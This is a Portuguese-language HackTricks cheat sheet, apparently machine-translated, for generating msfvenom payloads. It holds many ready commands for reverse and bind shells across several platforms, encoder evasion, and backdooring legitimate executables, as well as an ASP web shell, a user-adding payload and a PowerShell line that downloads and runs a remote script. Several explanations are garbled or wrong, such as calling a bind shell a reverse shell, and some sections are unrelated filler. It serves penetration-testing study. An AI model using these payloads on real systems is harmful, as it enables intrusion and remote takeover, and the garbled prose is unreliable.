# MSFVenom - CheatSheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando seus clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se a lenda do hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

---

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

Também é possível usar o `-a` para especificar a arquitetura ou a `--platform`

## Listagem
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## Parâmetros comuns ao criar um shellcode

Ao criar um shellcode, existem alguns parâmetros comuns que podem ser utilizados para personalizar o código gerado. Esses parâmetros permitem que você defina o tipo de payload, a arquitetura do sistema alvo, o formato de saída e outras opções relevantes. Abaixo estão alguns dos parâmetros mais comuns:

- **Payload**: Especifica o tipo de payload que será usado no shellcode, como um shell reverso ou um payload de execução de comandos.
- **Arquitetura**: Define a arquitetura do sistema alvo, como x86, x64 ou ARM.
- **Formato de saída**: Determina o formato de saída do shellcode, como raw, exe, elf ou macho.
- **Bad characters**: Permite especificar caracteres que devem ser evitados no shellcode, como caracteres nulos ou caracteres que podem causar problemas de codificação.
- **Encoder**: Define o encoder a ser usado para ofuscar o shellcode e evitar detecção, como o encoder XOR ou o encoder Shikata Ga Nai.
- **Tamanho**: Especifica o tamanho máximo do shellcode gerado.
- **Endereço de retorno**: Define o endereço de retorno para o shellcode, geralmente usado em ataques de estouro de buffer.

Esses parâmetros podem ser ajustados de acordo com as necessidades específicas do seu teste de penetração, permitindo que você crie um shellcode personalizado e eficaz para explorar vulnerabilidades em sistemas alvo.
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
A técnica de Reverse Shell é usada para estabelecer uma conexão de rede reversa entre o alvo e o atacante. Isso permite que o atacante assuma o controle do sistema alvo remotamente. O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads de Reverse Shell para sistemas Windows.

#### **Gerando um Payload de Reverse Shell**

Para gerar um payload de Reverse Shell usando o `msfvenom`, você precisa especificar o tipo de payload, o endereço IP do atacante e a porta que será usada para a conexão reversa. Aqui está o comando básico para gerar um payload de Reverse Shell para o Windows:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_DO_ATACANTE> LPORT=<PORTA> -f exe > shell.exe
```

Substitua `<IP_DO_ATACANTE>` pelo endereço IP do atacante e `<PORTA>` pela porta que você deseja usar para a conexão reversa.

Depois de executar o comando, o `msfvenom` gerará um arquivo executável chamado `shell.exe`, que será o payload de Reverse Shell.

#### **Executando o Payload de Reverse Shell**

Depois de gerar o payload de Reverse Shell, você precisa executá-lo no sistema alvo. Existem várias maneiras de fazer isso, dependendo do contexto e do acesso ao sistema alvo.

Uma maneira comum de executar o payload de Reverse Shell é enviá-lo para o sistema alvo por meio de um vetor de ataque, como um arquivo malicioso anexado a um e-mail ou um link de download falso. Quando o usuário alvo abrir o arquivo ou clicar no link, o payload será executado e estabelecerá uma conexão reversa com o atacante.

Outra opção é usar uma técnica de exploração para injetar o payload de Reverse Shell em um processo em execução no sistema alvo. Isso pode ser feito aproveitando uma vulnerabilidade conhecida no sistema ou em um aplicativo em execução.

Independentemente do método escolhido, uma vez que o payload de Reverse Shell seja executado no sistema alvo, ele tentará estabelecer uma conexão reversa com o endereço IP e a porta especificados durante a geração do payload. O atacante pode então usar uma ferramenta como o Metasploit Framework para interagir com o sistema alvo e executar comandos remotamente.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### Bind Shell

Uma bind shell é um tipo de shell reversa que permite que um invasor se conecte a um sistema comprometido e obtenha acesso ao shell do sistema. Ao contrário de uma shell reversa, onde o invasor inicia a conexão, em uma bind shell o sistema comprometido aguarda por uma conexão do invasor.

O `msfvenom` é uma ferramenta poderosa do Metasploit Framework que permite gerar payloads personalizados para exploração de vulnerabilidades. Com o `msfvenom`, é possível criar um payload para uma bind shell e injetá-lo em um sistema alvo.

A sintaxe básica para gerar um payload de bind shell usando o `msfvenom` é a seguinte:

```
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: o payload específico que você deseja usar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: o endereço IP do seu sistema.
- `<porta>`: a porta que será usada para a conexão.
- `<formato>`: o formato de saída desejado, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: o nome do arquivo de saída onde o payload será salvo.

Por exemplo, para gerar um payload de bind shell para um sistema Windows, usando o payload `windows/meterpreter/reverse_tcp`, com seu endereço IP sendo `192.168.0.100` e a porta `4444`, no formato `exe` e salvando-o como `payload.exe`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=4444 -f exe -o payload.exe
```

Depois de gerar o payload, você pode implantá-lo no sistema alvo e iniciar uma conexão reversa usando uma ferramenta como o Metasploit Framework. Isso permitirá que você obtenha acesso ao shell do sistema comprometido e execute comandos nele.
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
To create a user, you can use the `msfvenom` tool in Metasploit. The `msfvenom` tool allows you to generate various types of payloads, including shellcode, which can be used to create a user on a target system.

Here is an example command to create a user using `msfvenom`:

```plaintext
msfvenom -p windows/adduser USER=username PASS=password -f exe > adduser.exe
```

This command will generate an executable file called `adduser.exe` that, when executed on a Windows system, will create a new user with the specified username and password.

You can customize the payload by changing the `USER` and `PASS` parameters to the desired username and password, respectively. Additionally, you can modify the output format (`-f`) to suit your needs.

Remember to use this technique responsibly and only on systems that you have proper authorization to access.
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### Shell CMD

O shell CMD é um shell de comando do Windows que permite aos usuários interagir com o sistema operacional por meio de comandos de texto. É uma ferramenta poderosa para executar tarefas administrativas e automatizar processos no Windows.

O shell CMD pode ser usado para executar comandos, scripts e programas no Windows. Ele fornece uma interface de linha de comando para executar várias operações, como criar, copiar, excluir e renomear arquivos, gerenciar serviços, configurar redes e muito mais.

O shell CMD também suporta variáveis de ambiente, que podem ser usadas para armazenar valores e passá-los para comandos e scripts. Isso permite a criação de scripts mais avançados e automatizados.

Para abrir o shell CMD, você pode pressionar a tecla Windows + R e digitar "cmd" ou pesquisar por "Prompt de Comando" no menu Iniciar. Isso abrirá uma janela de comando onde você pode digitar os comandos desejados.

O shell CMD é uma ferramenta essencial para administradores de sistemas e usuários avançados do Windows, pois oferece uma maneira eficiente de interagir com o sistema operacional e executar tarefas de forma rápida e eficaz.
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **Executar Comando**

The `msfvenom` tool can be used to generate payloads that allow for command execution on a target system. This can be useful during a penetration test to gain remote access and control over the target.

To generate a payload that executes a command, you can use the following command:

```
msfvenom -p cmd/unix/reverse_netcat LHOST=<attacker IP> LPORT=<attacker port> -f <output format> -o <output file>
```

Replace `<attacker IP>` with the IP address of the machine running the listener, and `<attacker port>` with the port number on which the listener is running.

The `<output format>` can be any format supported by `msfvenom`, such as `raw`, `elf`, `exe`, `dll`, `psh`, `asp`, `jsp`, `war`, `pl`, `py`, `rb`, `ps1`, `hta`, `c`, `cpp`, `java`, `msi`, `msu`, `vba`, `vbs`, `hta-psh`, `asp-psh`, `jsp-psh`, `war-psh`, `pl-psh`, `py-psh`, `rb-psh`, `ps1-psh`, `c-psh`, `cpp-psh`, `java-psh`, `msi-psh`, `msu-psh`, `vba-psh`, or `vbs-psh`.

The `<output file>` is the name of the file that will contain the generated payload.

Once the payload is generated, you can transfer it to the target system and execute it to gain command execution.

Note: It is important to ensure that you have proper authorization and legal permission before attempting to execute commands on a target system.
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### Codificador

O codificador é uma ferramenta essencial no arsenal de um hacker. Ele é usado para ofuscar o payload e evitar a detecção pelos sistemas de segurança. O Metasploit Framework fornece uma variedade de codificadores que podem ser usados com o `msfvenom` para criar payloads personalizados.

#### Codificadores disponíveis

Aqui estão alguns dos codificadores disponíveis no Metasploit Framework:

- `x86/shikata_ga_nai`: Este codificador é baseado em metamorfose e é eficaz contra sistemas de detecção de assinaturas.
- `x86/jmp_call_additive`: Este codificador usa instruções `jmp` e `call` para ofuscar o payload.
- `x86/call4_dword_xor`: Este codificador usa instruções `call` e `xor` para ofuscar o payload.

#### Uso do codificador

Para usar um codificador com o `msfvenom`, você precisa especificar o codificador desejado usando a opção `-e` seguida pelo nome do codificador. Por exemplo, para usar o codificador `x86/shikata_ga_nai`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -e x86/shikata_ga_nai -f exe > payload.exe
```

Isso criará um payload do tipo `exe` usando o codificador `x86/shikata_ga_nai`.

#### Personalização do codificador

Você também pode personalizar o codificador especificando opções adicionais. Por exemplo, você pode definir o número de iterações usando a opção `-i`. Quanto maior o número de iterações, mais ofuscado será o payload. Você também pode usar a opção `-b` para especificar caracteres proibidos que devem ser evitados no payload.

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -e x86/shikata_ga_nai -i 5 -b '\x00\x0a\x0d' -f exe > payload.exe
```

Neste exemplo, o codificador `x86/shikata_ga_nai` será usado com 5 iterações e os caracteres nulos, de nova linha e de retorno de carro serão evitados no payload.

#### Conclusão

Os codificadores são ferramentas poderosas que podem ajudar a evitar a detecção de payloads pelos sistemas de segurança. Ao usar o `msfvenom`, você pode facilmente criar payloads personalizados com codificadores específicos para atender às suas necessidades.
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### Incorporado dentro do executável

O `msfvenom` pode ser usado para incorporar um payload dentro de um executável existente. Isso permite que você execute o payload sem chamar a atenção, pois ele estará oculto dentro do arquivo executável original.

Para incorporar um payload em um executável, você precisa especificar o tipo de payload, a arquitetura do sistema alvo, o formato do arquivo de saída e o nome do arquivo de entrada. Por exemplo, para incorporar um payload do tipo `windows/meterpreter/reverse_tcp` em um executável de 32 bits chamado `original.exe`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f exe -a x86 --platform windows -x original.exe -k -o embedded.exe
```

Neste exemplo, o `msfvenom` criará um novo arquivo chamado `embedded.exe`, que conterá o payload incorporado. Quando o `embedded.exe` for executado no sistema alvo, o payload será ativado e estabelecerá uma conexão reversa com o endereço IP e porta especificados.

Certifique-se de que o executável original seja compatível com a arquitetura do sistema alvo e que você tenha permissão legal para incorporar um payload nele. O uso indevido dessa técnica pode ser ilegal e violar a privacidade e a segurança de terceiros.
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
### Shell Reverso

O shell reverso é uma técnica comumente usada em testes de penetração para obter acesso remoto a um sistema Linux. Ele permite que um invasor estabeleça uma conexão de rede reversa com a máquina alvo, fornecendo assim controle total sobre o sistema.

#### Gerando um Payload com o msfvenom

O msfvenom é uma ferramenta poderosa do Metasploit Framework que permite gerar payloads personalizados para várias plataformas. Para gerar um payload de shell reverso para Linux, você pode usar o seguinte comando:

```plaintext
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<porta> -f <formato> -o <nome do arquivo de saída>
```

Substitua `<payload>` pelo payload desejado, `<seu endereço IP>` pelo seu endereço IP público ou privado, `<porta>` pela porta que você deseja usar para a conexão reversa, `<formato>` pelo formato de saída desejado (por exemplo, elf, raw, etc.) e `<nome do arquivo de saída>` pelo nome do arquivo de saída desejado.

#### Exemplo

Aqui está um exemplo de comando para gerar um payload de shell reverso para Linux usando o msfvenom:

```plaintext
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f elf -o reverse_shell.elf
```

Neste exemplo, estamos gerando um payload de shell reverso para Linux na arquitetura x86, com o endereço IP do host sendo 192.168.0.10 e a porta sendo 4444. O formato de saída escolhido é ELF e o arquivo de saída será chamado reverse_shell.elf.

#### Executando o Payload

Depois de gerar o payload, você pode transferi-lo para o sistema alvo e executá-lo. Uma vez executado, o payload estabelecerá uma conexão reversa com o seu sistema, permitindo que você interaja com o sistema alvo remotamente.

Para receber a conexão reversa, você pode usar uma variedade de ferramentas, como o netcat ou o Metasploit Framework. Certifique-se de configurar corretamente o endereço IP e a porta para receber a conexão reversa.
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### Bind Shell

Uma bind shell é um tipo de shell reversa que permite que um invasor se conecte a um sistema comprometido e obtenha acesso ao shell do sistema. Ao contrário de uma shell reversa, onde o invasor inicia a conexão, em uma bind shell, o sistema comprometido aguarda por uma conexão de entrada do invasor.

O `msfvenom` é uma ferramenta poderosa que pode ser usada para gerar payloads para shells bind. Ele permite que você personalize o payload de acordo com suas necessidades, como o endereço IP e a porta que o sistema comprometido irá aguardar por conexões.

Aqui está um exemplo de como usar o `msfvenom` para gerar um payload para uma bind shell:

```
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > shell.exe
```

Neste exemplo, estamos gerando um payload para uma bind shell no Windows, que irá aguardar por conexões na porta 4444. O payload é salvo em um arquivo chamado `shell.exe`.

Depois de gerar o payload, você pode transferi-lo para o sistema comprometido e executá-lo. Uma vez que o payload é executado, o sistema comprometido estará aguardando por uma conexão do invasor na porta especificada. O invasor pode então se conectar ao sistema comprometido usando uma ferramenta como o `netcat` e obter acesso ao shell do sistema.

É importante lembrar que o uso de bind shells para fins maliciosos é ilegal e antiético. Este conhecimento deve ser usado apenas para fins educacionais e em um ambiente controlado, como parte de um teste de penetração autorizado.
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
### SunOS (Solaris)

O SunOS (Solaris) é um sistema operacional baseado em Unix desenvolvido pela Sun Microsystems. Ele é amplamente utilizado em servidores e estações de trabalho. O Solaris oferece uma plataforma estável e segura para executar aplicativos críticos de negócios.

#### Compilando um payload para o Solaris

O `msfvenom` é uma ferramenta poderosa que permite gerar payloads personalizados para várias plataformas, incluindo o Solaris. Aqui está um exemplo de como compilar um payload para o Solaris usando o `msfvenom`:

```plaintext
msfvenom -p solaris/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f elf > payload.elf
```

Neste exemplo, estamos usando o payload `solaris/x86/shell_reverse_tcp`, que cria uma conexão reversa TCP para o seu endereço IP e porta especificados. Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP real e `<sua porta>` pela porta desejada.

Depois de executar o comando acima, o `msfvenom` irá gerar o payload e salvá-lo em um arquivo chamado `payload.elf`. Este arquivo pode ser transferido para o sistema Solaris alvo e executado para estabelecer uma conexão reversa com o seu sistema.

#### Executando o payload no Solaris

Para executar o payload no Solaris, você pode usar o comando `nc` (netcat) para ouvir a porta especificada no payload:

```plaintext
nc -l -p <sua porta>
```

Em seguida, transfira o arquivo `payload.elf` para o sistema Solaris alvo e execute-o:

```plaintext
./payload.elf
```

Isso irá iniciar o payload e estabelecer uma conexão reversa com o seu sistema. Você poderá interagir com o shell remoto e executar comandos no sistema Solaris alvo.

#### Considerações finais

Ao compilar e executar payloads no Solaris, é importante garantir que você tenha permissões adequadas e esteja agindo dentro dos limites legais. O uso indevido de técnicas de hacking pode ser ilegal e sujeito a penalidades. Certifique-se de obter autorização adequada antes de realizar qualquer atividade de pentesting ou hacking.
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
### **Shell Reverso:**

O shell reverso é uma técnica comum usada em pentest para estabelecer uma conexão de rede reversa entre o alvo e o atacante. Isso permite que o atacante assuma o controle do sistema comprometido e execute comandos remotamente.

O `msfvenom` é uma ferramenta poderosa que faz parte do framework Metasploit. Ele permite gerar payloads personalizados para várias plataformas, incluindo o macOS.

Aqui está um exemplo de como gerar um payload de shell reverso para o macOS usando o `msfvenom`:

```plaintext
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f macho > shell.macho
```

Neste exemplo, substitua `<seu endereço IP>` pelo endereço IP do seu servidor de escuta e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de gerar o payload, você pode implantá-lo no sistema de destino e iniciar o servidor de escuta para receber a conexão reversa.

Lembre-se de que o uso de técnicas de hacking sem permissão é ilegal e pode ter consequências graves. Certifique-se de obter a devida autorização antes de realizar qualquer teste de penetração.
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
A **Bind Shell** is a type of shell that listens for incoming connections on a specific port. Once a connection is established, the shell provides a command-line interface to interact with the target system. This type of shell is commonly used in scenarios where the attacker has control over the target's network and wants to establish a persistent backdoor.

To create a bind shell payload using **msfvenom**, you can use the following command:

```plaintext
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<port> -f <format> -o <output file>
```

- `<payload>`: The payload to use, such as `windows/meterpreter/reverse_tcp` or `linux/x86/shell/bind_tcp`.
- `<attacker IP>`: The IP address of the attacker machine.
- `<port>`: The port number to listen on.
- `<format>`: The output format, such as `exe`, `elf`, or `raw`.
- `<output file>`: The file to save the generated payload.

For example, to create a bind shell payload for a Windows target, listening on port 4444, and save it as an executable file named `payload.exe`, you can use the following command:

```plaintext
msfvenom -p windows/meterpreter/bind_tcp LHOST=<attacker IP> LPORT=4444 -f exe -o payload.exe
```

Remember to replace `<attacker IP>` with your actual IP address.

Once the payload is generated, you can transfer it to the target system and execute it to establish the bind shell.
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
## **Cargas úteis baseadas na web**

### **PHP**

#### Shell reverso
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
O seguinte é um exemplo de um shell reverso em ASP/x:

```asp
<%@ Language=VBScript %>
<%
    Dim cmd
    cmd = Request.QueryString("cmd")
    If cmd <> "" Then
        Dim oShell
        Set oShell = CreateObject("WScript.Shell")
        Dim oExec
        Set oExec = oShell.Exec(cmd)
        Dim output
        output = oExec.StdOut.ReadAll()
        Response.Write(output)
    End If
%>
```

Este código permite executar comandos no servidor alvo através de uma solicitação GET. Para usar o shell reverso, você precisa enviar uma solicitação GET com o parâmetro `cmd` contendo o comando que deseja executar. O resultado do comando será retornado como resposta.

Para criar um payload ASP/x usando o `msfvenom`, você pode usar o seguinte comando:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f asp > shell.asp
```

Substitua `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que deseja usar para a conexão reversa.

Depois de gerar o payload, você pode fazer o upload do arquivo `shell.asp` para o servidor alvo e acessá-lo através de uma solicitação GET para obter acesso ao shell reverso. Certifique-se de que o servidor esteja configurado para executar arquivos ASP/x.
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
O seguinte é um exemplo de um shell reverso em JSP usando o msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<sua porta> -f war > shell.war
```

Este comando irá gerar um arquivo WAR chamado `shell.war` que contém o shell reverso em JSP. Você pode implantar esse arquivo em um servidor web compatível com JSP para estabelecer uma conexão reversa com o seu sistema.

Certifique-se de substituir `<seu endereço IP>` pelo seu endereço IP e `<sua porta>` pela porta que você deseja usar para a conexão reversa.

Depois de implantar o arquivo WAR em um servidor web, você pode acessar o shell reverso em JSP usando o seguinte URL:

```
http://<endereço IP do servidor>/<caminho para o arquivo WAR>/shell.jsp
```

Isso permitirá que você execute comandos no sistema remoto através do shell reverso em JSP.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
A técnica de Reverse Shell é usada para estabelecer uma conexão entre o atacante e o alvo, permitindo que o atacante controle o sistema comprometido remotamente. O atacante envia um payload malicioso para o sistema alvo, que, quando executado, estabelece uma conexão de volta ao atacante. Isso permite que o atacante execute comandos no sistema alvo e obtenha acesso remoto completo.

O Metasploit Framework fornece uma ferramenta chamada `msfvenom` que pode ser usada para gerar payloads maliciosos para diferentes tipos de shells reversos. O `msfvenom` permite personalizar o payload de acordo com as necessidades do atacante, como o tipo de shell reverso, o endereço IP e a porta para a conexão de volta.

Aqui está um exemplo de como gerar um payload de shell reverso usando o `msfvenom`:

```plaintext
msfvenom -p <payload> LHOST=<seu endereço IP> LPORT=<sua porta> -f <formato> -o <arquivo de saída>
```

- `<payload>`: O tipo de payload que você deseja gerar, como `windows/meterpreter/reverse_tcp` ou `linux/x86/meterpreter/reverse_tcp`.
- `<seu endereço IP>`: O endereço IP do seu sistema, onde você deseja receber a conexão de volta.
- `<sua porta>`: A porta em que você deseja receber a conexão de volta.
- `<formato>`: O formato do payload, como `exe`, `elf` ou `raw`.
- `<arquivo de saída>`: O nome do arquivo de saída onde o payload será salvo.

Depois de gerar o payload, você pode enviá-lo para o sistema alvo e executá-lo. Assim que o payload for executado, uma conexão de shell reverso será estabelecida entre o sistema alvo e o seu sistema, permitindo que você execute comandos no sistema alvo remotamente.
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
### NodeJS

NodeJS é uma plataforma de desenvolvimento de aplicativos de código aberto que permite a execução de JavaScript no lado do servidor. Ele utiliza o mecanismo de JavaScript do Chrome para fornecer um ambiente de execução rápido e eficiente. O NodeJS é amplamente utilizado para criar aplicativos web escaláveis e em tempo real, bem como para desenvolver ferramentas de linha de comando.

#### Benefícios do NodeJS

- **Desempenho**: O NodeJS é conhecido por seu desempenho excepcionalmente rápido devido ao seu modelo de E/S não bloqueante. Isso permite que o NodeJS lide com um grande número de conexões simultâneas sem sobrecarregar o servidor.

- **Escalabilidade**: O NodeJS é altamente escalável, permitindo que os aplicativos lidem com um grande número de solicitações simultâneas de forma eficiente. Ele também suporta a criação de aplicativos em tempo real, como bate-papos e jogos multiplayer.

- **Ecossistema robusto**: O NodeJS possui um ecossistema rico de pacotes e bibliotecas disponíveis através do gerenciador de pacotes npm. Isso facilita o desenvolvimento de aplicativos complexos, pois muitas funcionalidades já estão disponíveis como pacotes prontos para uso.

- **Facilidade de desenvolvimento**: O NodeJS utiliza JavaScript, uma linguagem de programação popular e amplamente conhecida, o que torna mais fácil para os desenvolvedores criar aplicativos web e APIs RESTful.

#### Desenvolvimento de Aplicativos com NodeJS

Para desenvolver aplicativos com NodeJS, você pode usar uma variedade de estruturas e bibliotecas, como o Express.js, que é um framework web minimalista e flexível. O Express.js simplifica o processo de criação de rotas, manipulação de solicitações e respostas, e gerenciamento de sessões.

Além disso, o NodeJS possui uma ampla gama de módulos integrados que fornecem funcionalidades adicionais, como o módulo `http` para criar um servidor HTTP, o módulo `fs` para manipulação de arquivos e o módulo `crypto` para criptografia.

#### Conclusão

O NodeJS é uma plataforma poderosa para o desenvolvimento de aplicativos web escaláveis e em tempo real. Com seu desempenho excepcional, escalabilidade e ecossistema robusto, o NodeJS se tornou uma escolha popular entre os desenvolvedores. Se você está procurando criar aplicativos web rápidos e eficientes, o NodeJS é definitivamente uma opção a ser considerada.
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **Cargas úteis de Linguagem de Script**

### **Perl**
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
### **Python**

Python é uma linguagem de programação de alto nível, interpretada e de propósito geral. É amplamente utilizada no desenvolvimento de scripts, automação de tarefas, análise de dados e desenvolvimento de aplicativos web. A sintaxe simples e legível do Python torna-o uma escolha popular entre os programadores.

#### **Msfvenom**

Msfvenom é uma ferramenta poderosa e versátil do Metasploit Framework que permite a geração de payloads personalizados. Esses payloads podem ser usados para explorar vulnerabilidades em sistemas alvo durante testes de penetração.

A sintaxe básica do msfvenom é a seguinte:

```
msfvenom -p <payload> [opções]
```

Onde `<payload>` é o tipo de payload que você deseja gerar e `[opções]` são os parâmetros adicionais que você pode especificar para personalizar o payload.

#### **Gerando um payload do Windows reverse shell**

Um exemplo comum de uso do msfvenom é a geração de um payload do Windows reverse shell. Esse tipo de payload permite que um invasor estabeleça uma conexão reversa com o sistema alvo, fornecendo acesso remoto ao prompt de comando.

Aqui está um exemplo de comando para gerar um payload do Windows reverse shell usando o msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<seu endereço IP> LPORT=<porta> -f exe > payload.exe
```

Substitua `<seu endereço IP>` pelo seu endereço IP e `<porta>` pela porta que você deseja usar para a conexão reversa.

Depois de executar o comando, um arquivo chamado `payload.exe` será gerado. Esse arquivo pode ser implantado no sistema alvo para estabelecer a conexão reversa.

#### **Conclusão**

O msfvenom é uma ferramenta essencial para hackers éticos e profissionais de segurança cibernética. Com ele, é possível gerar payloads personalizados para explorar vulnerabilidades em sistemas alvo durante testes de penetração. É importante usar essa ferramenta com responsabilidade e apenas para fins legais e éticos.
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash**

Bash é uma linguagem de script amplamente utilizada em sistemas operacionais baseados em Unix. É uma das shells mais populares e oferece uma ampla gama de recursos e funcionalidades. O Bash é conhecido por sua flexibilidade e facilidade de uso, tornando-o uma escolha popular entre os hackers.

#### **Injeção de código Bash**

A injeção de código Bash é uma técnica comum usada por hackers para explorar vulnerabilidades em sistemas. Envolve a inserção de comandos Bash maliciosos em entradas de usuário não filtradas, permitindo que os hackers executem comandos arbitrários no sistema alvo.

#### **Execução de comandos Bash**

A execução de comandos Bash é uma técnica usada para executar comandos no sistema operacional usando a shell Bash. Os hackers podem explorar essa técnica para executar comandos maliciosos no sistema alvo, permitindo-lhes obter acesso não autorizado ou realizar outras atividades prejudiciais.

#### **Scripts Bash maliciosos**

Os scripts Bash maliciosos são programas de script escritos na linguagem Bash que têm a intenção de realizar atividades maliciosas. Esses scripts podem ser usados para realizar várias ações, como roubar informações confidenciais, comprometer a segurança do sistema ou causar danos aos dados.

#### **Proteção contra ataques Bash**

Para proteger um sistema contra ataques Bash, é importante implementar práticas de segurança adequadas, como:

- Filtrar e validar todas as entradas de usuário para evitar a injeção de código malicioso.
- Manter o sistema operacional e os softwares atualizados com as últimas correções de segurança.
- Usar firewalls e sistemas de detecção de intrusões para monitorar e bloquear atividades suspeitas.
- Implementar políticas de acesso e permissões adequadas para restringir o acesso não autorizado.
